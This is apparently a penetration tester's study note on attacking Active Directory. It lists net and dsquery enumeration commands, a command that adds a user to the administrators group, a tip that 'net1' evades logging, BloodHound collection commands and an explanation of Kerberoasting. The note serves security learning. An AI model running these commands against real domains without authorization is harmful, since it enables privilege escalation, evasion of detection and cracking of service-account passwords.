| `net group "Domain Admins" /domain`             | List users with domain admin privileges                                                                                      |
| `net group "domain computers" /domain`          | List of PCs connected to the domain                                                                                          |
| `net group "Domain Controllers" /domain`        | List PC accounts of domains controllers                                                                                      |
| `net group <domain_group_name> /domain`         | User that belongs to the group                                                                                               |
| `net groups /domain`                            | List of domain groups                                                                                                        |
| `net localgroup`                                | All available groups                                                                                                         |
| `net localgroup administrators /domain`         | List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default) |
| `net localgroup Administrators`                 | Information about a group (admins)                                                                                           |
| `net localgroup administrators [username] /add` | Add user to administrators                                                                                                   |
| `net share`                                     | Check current shares                                                                                                         |
| `net user <ACCOUNT_NAME> /domain`               | Get information about a user within the domain                                                                               |
| `net user /domain`                              | List all users of the domain                                                                                                 |
| `net user %username%`                           | Information about the current user                                                                                           |
| `net use x: \computer\share`                    | Mount the share locally                                                                                                      |
| `net view`                                      | Get a list of computers                                                                                                      |
| `net view /all /domain[:domainname]`            | Shares on the domains                                                                                                        |
| `net view \computer /ALL`                       | List shares of a computer                                                                                                    |
| `net view /domain`                              | List of PCs of the domain                                                                                                    |
Useful: [Docs](https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2). Also typing `net1` instead of just `net` executes the same command, but may get around some filters or logging.

**Dsquery**
[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)) is used to find AD objects. These queries can replace `BloodHound` and `PowerView`. It requires admin privileges and exists on any host with an `Active Directory Domain Services Role` installed. It's found at `C:\Windows\System32\dsquery.dll`.
```PowerShell
# Get user info
dsquery user

# Get computer info
dsquery computer

# Wildcard query for all objects in an OU
dsquery * "CN=Users,DC=<Domain>,DC=LOCAL"

# Users with attribute in userAccountControl set
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

# Find domain controllers
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

Notice that the above queries use specific terms in their queries. `userAccountControl:1.2.840.113556.1.4.803:` Specifies that we are looking at the [User Account Control (UAC) attributes](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties). These objects have different values that identify them (also known as [Object Identifiers (OIDs)](https://ldap.com/ldap-oid-reference-guide/). 
![[Pasted image 20241206200007.png]]

Useful: [LDAP Attributes](https://documentation.sailpoint.com/connectors/active_directory/help/integrating_active_directory/ldap_names.html)
# Bloodhound
This is one of the best tools for AD audits. It's actually so good that it deserves its own section. It'll take massive amounts of data and create graphical representations of it, letting us see attack paths. It consists of two parts: [`SharpHound collector`](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) written in C# for use on Windows or `BloodHound.py collector` for use on Linux, and [`BloodHound`](https://github.com/BloodHoundAD/BloodHound/releases)GUI. After uploading collected `.json` files, we can run prebuilt queries or write custom queries using [`Cypher language`](https://blog.cptjesus.com/posts/introtocypher). 

Collecting on Linux:
```shell
sudo bloodhound-python -u '<user>' -p '<pass>' -ns <IP> -d <domain> -c all
# Use -c or --collectionmethod to specify which data to retrieve
```
Starting the GUI:
```shell
sudo neo4j start
bloodhound # this will start the GUI, then we can upload individually or by zip
```
Collecting on Windows:
```PowerShell
.\SharpHound.exe -c All --zipfilename <out file>
```

Here's a useful [cheatsheet](https://redfoxsec.com/blog/bloodhound-cheat-sheet/) for queries.
# Kerberoasting
Lateral movement and privesc technique in AD environments. It targets [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) accounts, which Kerberos uses to map service instances to service accounts. Domain accounts are used to run services to overcome authentication of built in accounts. 

Any domain user can request a Kerberos ticket for any service account in the same domain. It's also possible across forest trusts depending on the environment. All that's needed is an account's NTLM hash or password, and a shell in the context of the domain user. We can also just have SYSTEM level access on a domain joined host.

Most service accounts are granted admin access on different systems. This is because services often require elevated privileges. These accounts can also be added to privileged groups, such as Domain Admin. 

Getting a Kerberos ticket for an account with an SPN doesn't allow to execute commands on behalf of the account, but the ticket (TGS-REP) is encrypted using the service account's NTLM hash, so the cleartext password can possibly be cracked. Accounts with weak or reused passwords are common since they simplify administration, so it's not uncommon to see this.

Here's where we can perform the attack from:
- Non-domain joined Linux host with valid domain user credentials
- Domain joined Linux host as root after retrieving the keytab file
- From a domain joined Windows host authenticated as a domain user
- From a domain joined Windows host with a shell of a domain user
- As SYSTEM on a domain joined Windows host
- From a non-domain joined Windows host using [`runas`](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) with the option `/netonly`

Here's some tools we can use:
- [`GetUserSPNs.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host
- A combination of `setspn.exe` (it's built-in to Windows), PowerShell, and `Mimikatz`
- From Windows using `PowerView`, [Rubeus](https://github.com/GhostPack/Rubeus), and a few scripts.

Note that after we obtain a TGS ticket, it doesn't guarantee that we can crack the password or get an account that has the privileges we want. TGS tickets also take longer to crack than other formats as well.

---
Navigation: [[Pentesting]]